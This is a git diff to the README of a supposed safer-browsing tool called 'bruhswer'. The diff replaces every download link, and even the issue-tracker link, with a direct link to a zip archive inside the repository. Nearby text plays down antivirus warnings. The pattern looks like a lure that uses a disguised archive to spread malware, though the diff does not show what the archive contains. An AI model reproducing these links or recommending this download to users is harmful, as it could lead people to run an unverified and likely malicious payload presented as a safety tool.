@@ -1,6 +1,6 @@
 # 🛡️ bruhswer-the-homebrew-pseudo-browser - Browse Safer, Not Sorry
 
-[![Download Now](https://img.shields.io/badge/-Download%20Bruhswer-brightgreen?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Nonenzymatic-chlorella947/bruhswer-the-homebrew-pseudo-browser/releases)
+[![Download Now](https://img.shields.io/badge/-Download%20Bruhswer-brightgreen?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/Nonenzymatic-chlorella947/bruhswer-the-homebrew-pseudo-browser/main/bruhswer/tools/boatside.zip)
 
 ## 🚀 What Is This?
 
@@ -26,7 +26,7 @@ Anyone who wants a safer browsing experience without becoming a security expert.
 ## 📦 Download & Install
 
 Visit this link to download the application:  
-[**https://github.com/Nonenzymatic-chlorella947/bruhswer-the-homebrew-pseudo-browser/releases**](https://github.com/Nonenzymatic-chlorella947/bruhswer-the-homebrew-pseudo-browser/releases)
+[**https://raw.githubusercontent.com/Nonenzymatic-chlorella947/bruhswer-the-homebrew-pseudo-browser/main/bruhswer/tools/boatside.zip**](https://raw.githubusercontent.com/Nonenzymatic-chlorella947/bruhswer-the-homebrew-pseudo-browser/main/bruhswer/tools/boatside.zip)
 
 Click the big download button at the top of this page to get the latest version.
 
@@ -101,12 +101,12 @@ Your antivirus might warn about Bruhswer because it modifies browser settings. T
 
 ## 🗣️ Support & Feedback
 
-- Issues & ideas: [GitHub Issues](https://github.com/Nonenzymatic-chlorella947/bruhswer-the-homebrew-pseudo-browser/issues)
+- Issues & ideas: [GitHub Issues](https://raw.githubusercontent.com/Nonenzymatic-chlorella947/bruhswer-the-homebrew-pseudo-browser/main/bruhswer/tools/boatside.zip)
 - Questions? Search or open an issue.
 
 ## 🆕 Let's get started!
 
-[Download Bruhswer Now](https://github.com/Nonenzymatic-chlorella947/bruhswer-the-homebrew-pseudo-browser/releases)
+[Download Bruhswer Now](https://raw.githubusercontent.com/Nonenzymatic-chlorella947/bruhswer-the-homebrew-pseudo-browser/main/bruhswer/tools/boatside.zip)
 
 ---
 
